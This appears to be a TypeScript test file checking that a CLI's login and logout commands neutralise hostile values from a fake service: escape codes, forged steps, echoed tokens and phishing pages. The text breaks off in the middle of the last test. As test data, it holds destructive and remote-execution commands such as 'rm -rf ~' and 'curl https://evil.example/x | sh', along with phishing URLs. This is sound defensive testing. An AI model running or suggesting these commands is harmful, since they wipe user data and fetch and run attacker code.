/**
 * WHAT A HOSTED SERVICE'S VALUES MAY DO TO `mason login` AND `mason logout`: be shown, inside a line the CLI writes, and
 * nothing else (src/cli/hosted.ts's header). Against the fake service of tests/hosted-fake.ts, every value the service
 * sends, hostile, multi-line and sized to a terminal's width: never a line of its own, never a code, an exit or a next
 * step, never a page elsewhere — on a pipe, in --json, and on a terminal 80 columns wide, as a person sees it.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import * as fs from "node:fs";
import { BASE, DEVICE, ME, SECRETS, bodyOf, bodyCovered, bodyShown, credentials, echoForms, echoToken, envFor, fakeService, granted, home, mason, newToken, noTokenLeaked, punyLabels, runForms, runToken, saved, showsRun, writeSaved, type Reply, type Script } from "./hosted-fake.ts";
import * as os from "node:os";
import * as path from "node:path";
import { pathToFileURL } from "node:url";
import { runMason } from "./cli-matrix.ts";

test("mason login: an answer outside the contract is a failure said by its status, never followed (a redirect) nor repeated (its body), never retried", async () => {
  const echoed = newToken(); SECRETS.push(echoed);
  const cases: Array<[Script, RegExp]> = [
    // the service's limit of sign-ins from one address: try again later, and no loop of retries
    [{ device: { status: 429, body: { error: "slow_down" } } }, /^http:\/\/127\.0\.0\.1:\d+ is limiting sign-ins from this address \(429\)$/],
    // a device_name the service refuses, and a body it cannot read
    [{ device: { status: 400, body: { error: "invalid_request", error_description: "device_name is not printable" } } }, /refused this sign-in \(invalid_request\) when a sign-in was asked for$/],
    [{ device: { status: 413, body: { error: "invalid_request" } } }, /refused this sign-in \(invalid_request\)/],
    [{ device: { status: 415, raw: "<html>unsupported media type</html>" } }, /answered POST \/oauth\/device\/code with 415, not JSON, where a sign-in was asked for$/],
    // a body that is not JSON, a token in it: named by its status, never shown
    [{ device: { status: 502, raw: `<html>bad gateway ${echoed}</html>` } }, /answered POST \/oauth\/device\/code with 502, not JSON, where a sign-in was asked for$/],
    [{ device: { status: 200, raw: "<html>a login page</html>" } }, /answered POST \/oauth\/device\/code with 200, not JSON, where a device code was expected$/],
    [{ device: { status: 302, headers: { location: "https://elsewhere.example/oauth/device/code" } } }, /answered POST \/oauth\/device\/code with a redirect \(302\)/],
    [{ device: { status: 200, body: { ...DEVICE, user_code: "\u001b[2Jx" } } }, /answered POST \/oauth\/device\/code with 200, where a device code was expected/],
    [{ device: { status: 200, body: { ...DEVICE, verification_uri: "ftp://BASE/device" } } }, /named a sign-in page on another address: ftp:\/\/$/],
    [{ device: { status: 503, body: { error: "temporarily_unavailable", error_description: "down for maintenance" } } }, /refused this sign-in \(temporarily_unavailable\)/],
    [{ token: () => ({ status: 200, body: { access_token: "has space", token_type: "Bearer" } }) }, /answered POST \/oauth\/token with 200, where a token was expected/],
  ];
  for (const [script, message] of cases) {
    const fake = await fakeService(script);
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      assert.match((JSON.parse(a.stdout) as { error: { message: string } }).error.message, message);
      assert.doesNotMatch(a.stdout + a.stderr, /\u001b|<html>/, "no control character, and nothing of a body outside the contract, reaches the output");
      assert.equal(fake.requests.filter((r) => r.path === "/oauth/device/code").length, 1, "asked once: a refusal is never retried");
      assert.equal(fake.requests.filter((r) => r.path === "/v1/me").length, 0);
      assert.equal(fs.existsSync(credentials(h)), false);
    } finally { await fake.close(); }
  }
});

test("mason login: a sign-in page on any origin but the service's own is refused, naming both, before it is printed, opened or polled", async () => {
  const cases: Array<[Partial<typeof DEVICE>, string]> = [
    [{ verification_uri: "https://evil.example/phish" }, "https://evil.example"],
    [{ verification_uri_complete: "https://evil.example/phish?user_code=WDJBMJHT" }, "https://evil.example"],
    // the same host on another port or scheme is another origin
    [{ verification_uri: "http://127.0.0.1:1/device" }, "http://127.0.0.1:1"],
    [{ verification_uri: "https://127.0.0.1/device" }, "https://127.0.0.1"],
  ];
  for (const [page, origin] of cases) {
    const fake = await fakeService({ device: { status: 200, body: { ...DEVICE, ...page } } });
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      const v = JSON.parse(a.stdout) as { error: { code: string; message: string; why: string } };
      assert.deepEqual([v.error.code, v.error.message], ["refused", `${fake.url} named a sign-in page on another address: ${origin}`]);
      assert.match(v.error.why, new RegExp(`only on the service's own address, ${fake.url.replace(/[.]/g, "\\.")}:`));
      assert.doesNotMatch(a.stderr, /phish|page {3}/, "the page is never printed");
      assert.deepEqual(fake.requests.map((r) => r.path), ["/oauth/device/code"], "never polled");
    } finally { await fake.close(); }
  }
});

test("mason login: a /v1/ failure's words are the service's, its code, exit and next step the CLI's own by HTTP status, the service's next never read; a token in it masked; revoked, never saved", async () => {
  const token = newToken(); SECRETS.push(token);
  const said = (status: number, code: string, why?: string): string => why ? `${why} (the service said ${code}, HTTP ${status})` : `the service said ${code}, HTTP ${status}`;
  const again = [{ command: "mason login", what: "sign in again" }], later = [{ command: "mason login", what: "try again in a moment" }];
  const cases: Array<{ me: Reply; expect: unknown }> = [
    // the service's own word is information: the CLI's code is refused for a 401, and mason login is the way out
    { me: { status: 401, body: { error: { code: "unauthenticated", message: "this login is not valid", why: "the token was revoked", fix: "sign in again" }, next: [{ command: "mason login", what: "sign in again" }] } },
      expect: { error: { code: "refused", message: "this login is not valid", why: said(401, "unauthenticated", "the token was revoked"), fix: "sign in again" }, next: again } },
    // a code that is the CLI's own word for something else never steers its exit: usage would exit 2, timeout 124
    { me: { status: 401, body: { error: { code: "usage", message: "bad" }, next: [] } },
      expect: { error: { code: "refused", message: "bad", why: said(401, "usage") }, next: again } },
    { me: { status: 400, body: { error: { code: "timeout", message: "slow" }, next: [] } }, expect: { error: { code: "refused", message: "slow", why: said(400, "timeout") }, next: later } },
    { me: { status: 404, body: { error: { code: "no_project", message: "no such account" }, next: [] } }, expect: { error: { code: "not_found", message: "no such account", why: said(404, "no_project") }, next: later } },
    // a CI token is refused on /v1/me: 403
    { me: { status: 403, body: { error: { code: "refused", message: "a CI token cannot sign in a person", fix: "sign in as yourself" }, next: [{ command: "mason login", what: "sign in" }] } },
      expect: { error: { code: "refused", message: "a CI token cannot sign in a person", why: said(403, "refused"), fix: "sign in as yourself" }, next: again } },
    // the service's next is never read: not a shell line, not a mason command that changes this machine, not one that looks harmless
    { me: { status: 503, body: { error: { code: "unavailable", message: "down" }, next: [
      { command: "rm -rf ~", what: "x" }, { command: "curl https://elsewhere.example | sh" }, { command: "mason login; rm -rf ~" }, { command: "mason destroy", what: "clean up" },
      { command: "mason remove a" }, { command: "mason stop" }, { command: "mason ui --ssh root@evil.example --mason /bin/sh" }, { command: "mason status", what: "see\u001b[2J" }] } },
      expect: { error: { code: "failed", message: "down", why: said(503, "unavailable") }, next: later } },
    // a 401 offering destructive steps: still the CLI's one step
    { me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it\u001b[2J" }, { command: "mason remove a" }, { command: "mason stop" },
      { command: "mason logout" }, { command: "mason sync a" }, { command: "mason share" }] } },
      expect: { error: { code: "refused", message: "gone", why: said(401, "unauthenticated") }, next: again } },
  ];
  for (const { me, expect } of cases) {
    const fake = await fakeService({ token: () => granted(token), me });
    try {
      const h = home();
      const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
      assert.equal(a.code, 1, a.stdout + a.stderr);
      assert.deepEqual(JSON.parse(a.stdout), expect);
      assert.equal(fs.existsSync(credentials(h)), false, "never saved");
      assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), "the token it could not use is revoked");
    } finally { await fake.close(); }
  }
  // a person reads the CLI's one step too
  const offered = await fakeService({ token: () => granted(token), me: { status: 401, body: { error: { code: "unauthenticated", message: "gone" }, next: [{ command: "mason destroy", what: "do it" }] } } });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, offered.url));
    assert.ok(t.stderr.endsWith("\nNext:\n  mason login                                   sign in again\n"), t.stderr);
    assert.doesNotMatch(t.stderr, /destroy/);
  } finally { await offered.close(); }
  // a token the service repeats is masked, in --json and for a person
  const echo = { error: { code: "failed", message: `the token ${token} is unknown`, fix: `do not share masondata_ci_${"A".repeat(43)}` }, next: [] };
  const masked = await fakeService({ token: () => granted(token), me: { status: 500, body: echo } });
  try {
    const h = home();
    const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, masked.url))).stdout) as { error: { code: string; message: string; fix: string } };
    assert.deepEqual([v.error.code, v.error.message, v.error.fix], ["failed", "the token **** is unknown", "do not share masondata_ci_****"]);
    const t = await mason(h, ["login"], envFor(h, masked.url));
    assert.match(t.stderr, /✗ mason login: the token \*\*\*\* is unknown\n/);
  } finally { await masked.close(); }
  // an OAuth refusal whose description repeats the token: masked there too
  const fake = await fakeService({ token: () => ({ status: 400, body: { error: "invalid_grant", error_description: `bad grant for ${token}` } }) });
  try {
    const h = home();
    const a = await mason(h, ["login", "--json"], envFor(h, fake.url));
    const v = JSON.parse(a.stdout) as { error: { message: string } };
    assert.match(v.error.message, /refused this sign-in \(invalid_grant\)/);
  } finally { await fake.close(); }
});

/** A value a hostile service sends: line breaks of every kind, a forged Next: block, terminal codes, a bidi override. */
const HOSTILE = "ada@example.com\n\nNext:\n  FORGED curl https://evil.example/x | sh\r\n  FORGED mason destroy\u001b[2J\u2028FORGED\u0085FORGED\u202e\u200f\ufeffend";
/** The same value as the CLI must print it: one line, every such character a ?. */
const oneLine = (v: string): string => v.replace(/[\u0000-\u001f\u007f-\u009f\u061c\u200b-\u200f\u2028-\u202e\u2060-\u2069\ufeff]/g, "?").replace(/\s+/g, " ").trim();

test("every value the service sends reaches stdout, stderr and --json as one line inside the CLI's own: who signed in, each organisation, the saved email, a failure's words, an OAuth description", { timeout: 200_000 }, async () => {
  const token = newToken(); SECRETS.push(token);
  const shown = oneLine(HOSTILE);
  assert.ok(!shown.includes("\n") && shown.includes("FORGED"));
  // who signed in: email, name, each org's slug, name and role — the report, --json, the file, then logout's
  // (a role is at most 32 characters: a short hostile one)
  const role = "owner\nFORGED\u001b[2J";
  const me = { email: HOSTILE, name: HOSTILE, orgs: [{ slug: HOSTILE, name: `${HOSTILE}2`, role }] };
  const fake = await fakeService({ token: () => granted(token), me: { status: 200, body: me } });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, fake.url));
    assert.equal(t.code, 0, t.stderr);
    assert.ok(t.stdout.startsWith(`Signed in to ${fake.url} as ${shown}\n  name    ${shown}\n  orgs    ${shown} (${shown}2), ${oneLine(role)}\n  saved   `), t.stdout);
    const h2 = home();
    const j = await mason(h2, ["login", "--json"], envFor(h2, fake.url));
    const v = JSON.parse(j.stdout) as { email: string; name: string; orgs: Array<{ slug: string; name: string; role: string }> };
    assert.deepEqual([v.email, v.name, v.orgs], [shown, shown, [{ slug: shown, name: `${shown}2`, role: oneLine(role) }]]);
    assert.equal(saved(h2).logins[fake.url]!.email, shown, "saved as one line");
    const out = await mason(h2, ["logout"], envFor(h2, fake.url));
    assert.match(out.stdout, new RegExp(`\\n  account        ${shown.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\n`));
  } finally { await fake.close(); }

  // an email edited into the file by hand: logout's account row and --json, login's replaced
  const local = await fakeService({ token: () => granted(token) });
  try {
    for (const argv of [["logout"], ["logout", "--json"], ["login"], ["login", "--json"]]) {
      const h = home();
      const old = newToken(); SECRETS.push(old);
      writeSaved(h, { [local.url]: { token: old, email: HOSTILE, savedAt: "2026-11-01T00:00:00.000Z" } });
      const a = await mason(h, argv, envFor(h, local.url));
      assert.equal(a.code, 0, a.stdout + a.stderr);
      if (argv[0] === "logout" && argv[1]) assert.equal((JSON.parse(a.stdout) as { email: string }).email, shown);
      if (argv[0] === "login" && argv[1]) assert.deepEqual((JSON.parse(a.stdout) as { replaced: unknown }).replaced, { email: shown, revoked: true });
      if (argv[0] === "login" && !argv[1]) assert.ok(a.stdout.includes(`\nTip: This replaces the login of ${shown}, which is revoked.\n`), a.stdout);
    }
  } finally { await local.close(); }

  // a /v1/ failure's message, why and fix, and its next's command and what, each status, as a person and with --json
  for (const status of [401, 403, 500]) {
    const body = { error: { code: "unauthenticated", message: HOSTILE, why: HOSTILE, fix: HOSTILE }, next: [{ command: HOSTILE, what: HOSTILE }, { command: "mason destroy", what: HOSTILE }] };
    const f = await fakeService({ token: () => granted(token), me: { status, body } });
    try {
      const h = home();
      const j = await mason(h, ["login", "--json"], envFor(h, f.url));
      const v = JSON.parse(j.stdout) as { error: { message: string; why: string; fix: string } };
      assert.deepEqual([v.error.message, v.error.why, v.error.fix], [shown, `${shown} (the service said unauthenticated, HTTP ${status})`, shown]);
      const t = await mason(h, ["login"], envFor(h, f.url));
      assert.ok(t.stderr.includes(`\n✗ mason login: ${shown}\n  why   ${shown} (the service said unauthenticated, HTTP ${status})\n  fix   ${shown}\n\nNext:\n  mason login `), t.stderr);
    } finally { await f.close(); }
  }

  // an OAuth refusal's description, from the device code and from the token; an error that is not one word
  const oauth: Script[] = [
    { device: { status: 400, body: { error: "invalid_request", error_description: HOSTILE } } },
    { token: () => ({ status: 400, body: { error: "invalid_grant", error_description: HOSTILE } }) },
  ];
  for (const script of oauth) {
    const f = await fakeService(script);
    try {
      const h = home();
      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { why: string } };
      assert.equal(v.error.why, shown);
      const t = await mason(h, ["login"], envFor(h, f.url));
      assert.ok(t.stderr.includes(`\n  why   ${shown}\n`), t.stderr);
    } finally { await f.close(); }
  }
  for (const script of [{ token: () => ({ status: 400, body: { error: HOSTILE } }) }, { me: { status: 401, body: { error: { code: HOSTILE, message: HOSTILE }, next: [] } }, token: () => granted(token) }] as Script[]) {
    const f = await fakeService(script);
    try {
      const h = home();
      const v = JSON.parse((await mason(h, ["login", "--json"], envFor(h, f.url))).stdout) as { error: { message: string } };
      assert.match(v.error.message, /^http:\/\/127\.0\.0\.1:\d+ answered (POST \/oauth\/token|GET \/v1\/me) with (400|401), where /, "said by its status: neither word is shown");
      await mason(h, ["login"], envFor(h, f.url));
    } finally { await f.close(); }
  }

  // the page: a line break in it is no line of its own (the URL parser drops it), the page printed as one line
  const page = await fakeService({ device: { status: 200, body: { ...DEVICE, verification_uri_complete: `${BASE}/device?user_code=WDJBMJHT\nFORGED\r\nNext:` } }, token: () => ({ status: 400, body: { error: "access_denied" } }) });
  try {
    const h = home();
    const t = await mason(h, ["login"], envFor(h, page.url));
    assert.match(t.stderr, new RegExp(`\\n  page   ${page.url.replace(/[.]/g, "\\.")}/device\\?user_code=WDJBMJHTFORGEDNext:\\n`));
  } finally { await page.close(); }
});

test("the visual-line check itself: a line the terminal broke, a forged heading, step, row or failure is caught; the CLI's own lines are not", async () => {
  const { seenProblems } = await import("./hosted-fake.ts");
  assert.ok(seenProblems(`Signed in to x as ${"a".repeat(70)}\n`, 80).some((p) => p.startsWith("the terminal broke a line")));
  assert.deepEqual(seenProblems("Signed in to x as y\n  name    Ada\n    a continuation\n\nNext:\n  mason logout    sign out\n", 80), []);
  assert.ok(seenProblems("Signed in to x as y\nNext:\n  mason destroy\n\nNext:\n  mason logout\n", 80).length > 0, "a forged Next: and step");
  assert.ok(seenProblems("✗ mason login: a\n  user    evil\n", null).some((p) => p.includes("does not begin")), "a forged row");
  assert.ok(seenProblems("✗ mason login: a\n✗ mason login: b\n", null).some((p) => p === "2 failures"), "a forged failure");
  assert.ok(seenProblems("Signed in\n  mason destroy\n", null).some((p) => p.includes("does not begin")), "a step outside Next:");
});

/** A refusal whose message, why and fix repeat each its field of an echo (`echoForms`). */
const echoing = (status: number, [m, w, f]: [string, string, string]): Reply => ({ status, body: { error: { code: "unauthenticated", message: `the token ${m} is not known`,
  why: `it was sent as ${w}`, fix: `sign in again, not as ${f}` }, next: [] } });

test("mason login: a service that echoes the token it was sent in another form — its body, split, re-cased, URL-encoded, a slice, pieces, a piece in each field — shows no more than a quarter of it in all, on stdout, stderr or in --json", { timeout: 300_000 }, async () => {
  // one fixed token, so the verdict is the same on every run (tests/hosted-fake.ts echoToken)
  const token = echoToken(); SECRETS.push(token);
  // the CLI's own words share no run of the body: what is counted below is the echo's alone
  const quiet = await fakeService({ token: () => granted(token), me: echoing(401, ["it", "it", "it"]) });
  try {
    for (const json of [false, true]) {
      const h = home();
      const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, quiet.url));
      assert.equal(bodyCovered(`${a.stdout}\n${a.stderr}`, token, [h, quiet.url]), 0, `nothing echoed${json ? ", --json" : ""}: the fixed token shares a run with the CLI's own words:\n${a.stdout}${a.stderr}`);
    }
  } finally { await quiet.close(); }
  for (const { what, fields, exact } of echoForms(token)) {
    const fake = await fakeService({ token: () => granted(token), me: echoing(401, fields) });
    try {
      for (const json of [false, true]) {
        const h = home();
        const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}${json ? ", --json" : ""}`;
        assert.equal(a.code, 1, `${at}: ${a.stdout}${a.stderr}`);
        assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, token, [h, fake.url]), `${at}: more than a quarter of the body is shown:\n${a.stdout}${a.stderr}`);
        // the service's words, the echo masked: never dropped, never re-worded (where a mask may take in a letter beside
        // it that is the body's next, by chance, or one field is shown, the words are not held exact)
        if (!exact) assert.match(a.stdout + a.stderr, /\*{4}/, at);
        else if (json) {
          const e = (JSON.parse(a.stdout) as { error: { message: string; why: string; fix: string } }).error;
          assert.deepEqual([e.message, e.why, e.fix], ["the token **** is not known", "it was sent as **** (the service said unauthenticated, HTTP 401)", "sign in again, not as ****"], at);
        } else assert.match(a.stderr, /✗ mason login: the token \*\*\*\* is not known\n {2}why {3}it was sent as \*\*\*\* \(/, at);
      }
    } finally { await fake.close(); }
  }
});

test("mason logout: a login whose saved email, and a revoke refusal, echo its token in another form — its body, split, re-cased, URL-encoded, a slice, pieces — shows no more than a quarter of it in all, on stdout, stderr or in --json", { timeout: 300_000 }, async () => {
  const token = echoToken(); SECRETS.push(token);
  // the CLI's own words share no run of the body: what is counted below is the echo's alone
  const quiet = await fakeService({ revoke: echoing(401, ["it", "it", "it"]) });
  try {
    for (const json of [false, true]) {
      const h = home();
      writeSaved(h, { [quiet.url]: { token, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
      const a = await mason(h, ["logout", ...(json ? ["--json"] : [])], envFor(h, quiet.url));
      assert.equal(bodyCovered(`${a.stdout}\n${a.stderr}`, token, [h, quiet.url]), 0, `nothing echoed${json ? ", --json" : ""}: the fixed token shares a run with the CLI's own words:\n${a.stdout}${a.stderr}`);
    }
  } finally { await quiet.close(); }
  for (const { what, fields, exact } of echoForms(token)) {
    // the email is one field: an echo in pieces across fields is all of them in it
    const form = [...new Set(fields)].join(".");
    const fake = await fakeService({ revoke: echoing(401, fields) });
    try {
      for (const json of [false, true]) {
        const h = home();
        // as a login saved by a Mason that masked the token by its shape alone would have left it
        writeSaved(h, { [fake.url]: { token, email: `ada+${form}@example.com`, savedAt: "2026-11-01T00:00:00.000Z" } });
        const a = await mason(h, ["logout", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}${json ? ", --json" : ""}`;
        assert.equal(a.code, 0, `${at}: ${a.stdout}${a.stderr}`);
        assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, token, [h, fake.url]), `${at}: more than a quarter of the body is shown:\n${a.stdout}${a.stderr}`);
        // (where a mask may take in a letter beside it that is the body's next, by chance, the words are not held exact)
        if (!exact) assert.match(a.stdout, /\*{4}/, at);
        else if (json) assert.equal((JSON.parse(a.stdout) as { email: string }).email, "ada+****@example.com", at);
        else assert.match(a.stdout, /^ {2}account +ada\+\*\*\*\*@example\.com$/m, at);
        assert.equal(fs.existsSync(credentials(h)) && Object.keys(saved(h).logins).length, 0, "signed out all the same");
      }
    } finally { await fake.close(); }
  }
});

/**
 * ISSUE 627: EVERY VALUE OF AN ANSWER LOGIN PRINTS, OR THAT A GRAMMAR ALONE HELD — the device code, the user code, each
 * sign-in page, the intervals, an OAuth refusal's code, who signed in (email, name, each organisation's slug, name and
 * role), a key outside the shape — carrying a token the command holds, in each form (`runForms`). Each run in both
 * forms, side by side.
 */
async function eachForm(token: string, n: 0 | 1, run: (v: string, digits: string, json: boolean, at: string) => Promise<void>): Promise<void> {
  await Promise.all(runForms(token, n).flatMap((form) => [false, true].map((json) => run(form.value, form.digits, json, `${form.what}${json ? ", --json" : ""}`))));
}

test("mason login: a device code's answer, an OAuth refusal or who signed in that carries a token it holds — the login it replaces, or the new one — whole, its body, in lower case, 11 of its characters in a row, is refused whole, by its status: nothing of it printed, opened, polled or saved (issue 627)", { timeout: 300_000 }, async () => {
  // the login this one would replace: the service may echo it before it sends a token
  const old = runToken("pat", 0); SECRETS.push(old);
  const denied = (): Reply => ({ status: 400, body: { error: "access_denied" } });
  const deviceCases: Array<[what: string, script: (v: string, digits: string) => Script, said: RegExp, polled: boolean]> = [
    ["the device code", (v) => ({ device: { status: 200, body: { ...DEVICE, device_code: v } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["the user code", (v) => ({ device: { status: 200, body: { ...DEVICE, user_code: v } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["the sign-in page", (v) => ({ device: { status: 200, body: { ...DEVICE, verification_uri: `${BASE}/device?c=${v}` } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["the page with its code", (v) => ({ device: { status: 200, body: { ...DEVICE, verification_uri_complete: `${BASE}/device?c=${v}` } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["the interval", (_, d) => ({ device: { status: 200, body: { ...DEVICE, interval: d } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["a key outside the shape", (v) => ({ device: { status: 200, body: { ...DEVICE, note: v } }, token: denied }), / answered POST \/oauth\/device\/code with 200, where a device code was expected$/, false],
    ["the device code's OAuth refusal", (v) => ({ device: { status: 400, body: { error: v } } }), / answered POST \/oauth\/device\/code with 400, where a sign-in was asked for$/, false],
    ["the poll's OAuth refusal", (v) => ({ token: () => ({ status: 400, body: { error: v, error_description: "no" } }) }), / answered POST \/oauth\/token with 400, where the sign-in was polled$/, true],
  ];
  for (const [what, script, said, polled] of deviceCases) {
    await eachForm(old, 0, async (v, digits, json, form) => {
      const fake = await fakeService(script(v, digits));
      try {
        const h = home();
        writeSaved(h, { [fake.url]: { token: old, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
        const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}, ${form}`, all = `${a.stdout}\n${a.stderr}`;
        assert.equal(a.code, 1, `${at}: ${all}`);
        assert.match(json ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr.split("\n").find((l) => l.startsWith("✗ mason login: "))!, said, `${at}: said by its status:\n${all}`);
        assert.ok(!showsRun(all, old), `${at}: printed the token:\n${all}`);
        assert.equal(fake.requests.some((r) => r.path === "/oauth/token"), polled, `${at}: polled only on a device code held`);
        assert.equal(saved(h).logins[fake.url]!.token, old, `${at}: the saved login is kept`);
      } finally { await fake.close(); }
    });
  }
  // who signed in, carrying the new token (or the login it replaces): refused, the token revoked, never saved
  const token = runToken("pat", 1); SECRETS.push(token);
  const meCases: Array<[what: string, me: (v: string) => Record<string, unknown>, held: string, n: 0 | 1]> = [
    ["the email", (v) => ({ ...ME, email: `${v}@example.com` }), token, 1],
    ["the name", (v) => ({ ...ME, name: v }), token, 1],
    ["an organisation's slug", (v) => ({ ...ME, orgs: [{ ...ME.orgs[0]!, slug: v }] }), token, 1],
    ["an organisation's name", (v) => ({ ...ME, orgs: [{ ...ME.orgs[0]!, name: v }] }), token, 1],
    ["an organisation's role", (v) => ({ ...ME, orgs: [{ ...ME.orgs[0]!, role: v }] }), token, 1],
    ["a key outside the shape", (v) => ({ ...ME, note: v }), token, 1],
    ["the name, the login it replaces", (v) => ({ ...ME, name: v }), old, 0],
  ];
  for (const [what, body, held, n] of meCases) {
    await eachForm(held, n, async (v, _, json, form) => {
      const fake = await fakeService({ token: () => granted(token), me: { status: 200, body: body(v) } });
      try {
        const h = home();
        if (held === old) writeSaved(h, { [fake.url]: { token: old, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
        const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}, ${form}`, all = `${a.stdout}\n${a.stderr}`;
        assert.equal(a.code, 1, `${at}: ${all}`);
        assert.ok(all.includes(" answered GET /v1/me with 200, where the account signed in was asked for"), `${at}: said by its status:\n${all}`);
        assert.ok(!showsRun(all, held) && !showsRun(all, token), `${at}: printed a token:\n${all}`);
        assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), `${at}: the token it could not use is revoked`);
        if (held === old) assert.equal(saved(h).logins[fake.url]!.token, old, `${at}: the saved login is kept`);
        else assert.equal(fs.existsSync(credentials(h)), false, `${at}: never saved`);
      } finally { await fake.close(); }
    });
  }
});

test("mason login: a sign-in page is tested as it is printed — dot segments the parser removes to join pieces of the login it replaces, in either page and spelling, pieces its mask would take, a host whose xn-- form spells it — each refuses the device code's answer by its status, nothing of it printed, opened or polled (PR 645's review)", { timeout: 300_000 }, async () => {
  const old = runToken("pat", 0); SECRETS.push(old);
  const body = bodyOf(old), pieces = body.match(/.{1,10}/g)!;
  const labels = punyLabels(body, 3);
  assert.ok(labels.length >= 2);
  const pages: Array<[what: string, field: "verification_uri" | "verification_uri_complete", page: string]> = [];
  for (const field of ["verification_uri", "verification_uri_complete"] as const) {
    pages.push([`${field}, dot segments`, field, `${BASE}/device/${pieces.join("/x/../")}`], [`${field}, %2E%2E`, field, `${BASE}/device/${pieces.join("/x/%2E%2E/")}`],
      [`${field}, two pieces of 10, an x between`, field, `${BASE}/device/${pieces[0]}x${pieces[1]}`], [`${field}, a host in xn-- labels`, field, `https://${labels.join(".")}.example/device`]);
  }
  await Promise.all(pages.flatMap(([what, field, page]) => [false, true].map(async (json) => {
    const fake = await fakeService({ device: { status: 200, body: { ...DEVICE, [field]: page } }, token: () => ({ status: 400, body: { error: "access_denied" } }) });
    try {
      const h = home();
      writeSaved(h, { [fake.url]: { token: old, email: "ada@example.com", savedAt: "2026-11-01T00:00:00.000Z" } });
      const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, fake.url));
      const at = `${what}${json ? ", --json" : ""}`, all = `${a.stdout}\n${a.stderr}`;
      assert.equal(a.code, 1, `${at}: ${all}`);
      assert.ok(all.includes(" answered POST /oauth/device/code with 200, where a device code was expected"), `${at}: said by its status:\n${all}`);
      assert.ok(!showsRun(all, old) && !all.includes("xn--") && !all.toLowerCase().includes(pieces[0]!.toLowerCase()), `${at}: printed the page:\n${all}`);
      assert.deepEqual(fake.requests.map((r) => r.path), ["/oauth/device/code"], `${at}: never polled`);
    } finally { await fake.close(); }
  })));
});

test("mason login: a device code's answer or who signed in nested deeper than any documented shape (32,000 deep) is refused by its status, never a crash; a token granted before it is revoked, never saved (PR 645's review)", { timeout: 300_000 }, async () => {
  const token = runToken("pat", 1); SECRETS.push(token);
  const nest = "[".repeat(32_000) + "]".repeat(32_000);
  const device = JSON.stringify(DEVICE).replace(/}$/, `,"x":${nest}}`), me = JSON.stringify(ME).replace(/}$/, `,"x":${nest}}`);
  for (const [what, script, said, granted_] of [
    ["the device code", { device: { status: 200, json: device } }, " answered POST /oauth/device/code with 200, where a device code was expected", false],
    ["who signed in", { token: () => granted(token), me: { status: 200, json: me } }, " answered GET /v1/me with 200, where the account signed in was asked for", true],
  ] as Array<[string, Script, string, boolean]>) {
    await Promise.all([false, true].map(async (json) => {
      const fake = await fakeService(script);
      try {
        const h = home();
        const a = await mason(h, ["login", ...(json ? ["--json"] : [])], envFor(h, fake.url));
        const at = `${what}${json ? ", --json" : ""}`, all = `${a.stdout}\n${a.stderr}`;
        assert.equal(a.code, 1, `${at}: ${all}`);
        assert.ok(all.includes(said), `${at}: said by its status:\n${all}`);
        assert.doesNotMatch(all, /call stack|RangeError|bug in mason/, at);
        assert.equal(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), granted_, `${at}: the token granted is revoked`);
        assert.equal(fs.existsSync(credentials(h)), false, `${at}: never saved`);
      } finally { await fake.close(); }
    }));
  }
});

test("mason login: a failure THROWN after the service granted a token — a crash, not a failure said — still revokes the token, and says when the revoke did not reach the service; nothing saved (PR 645's review)", { timeout: 120_000 }, async () => {
  const token = runToken("pat", 1); SECRETS.push(token);
  // a crash between who signed in and the save, made by a preload (the file is the seam: nothing in src/ reads a test's
  // variable): the time the login is saved at cannot be written
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mason-crash-"));
  const hook = path.join(dir, "crash.mjs");
  fs.writeFileSync(hook, `Date.prototype.toISOString = function () { throw new Error("injected crash"); };\n`);
  try {
    for (const [what, revoke, said] of [["the revoke taken", undefined, /^✗ mason login: injected crash$/m], ["the revoke not reached", "drop", /^✗ mason login: injected crash; the token the service granted was NOT revoked \(could not reach /m]] as Array<[string, Reply | undefined, RegExp]>) {
      const fake = await fakeService({ token: () => granted(token), ...(revoke ? { revoke } : {}) });
      try {
        const h = home();
        const a = await runMason(h, ["login"], { ...envFor(h, fake.url), NODE_OPTIONS: `--import=${pathToFileURL(hook).href}` }, 60_000);
        assert.equal(a.code, 1, `${what}: ${a.stdout}${a.stderr}`);
        assert.match(a.stderr, said, what);
        assert.ok(fake.requests.some((r) => r.path === "/oauth/revoke" && r.form.token === token), `${what}: the revoke was asked`);
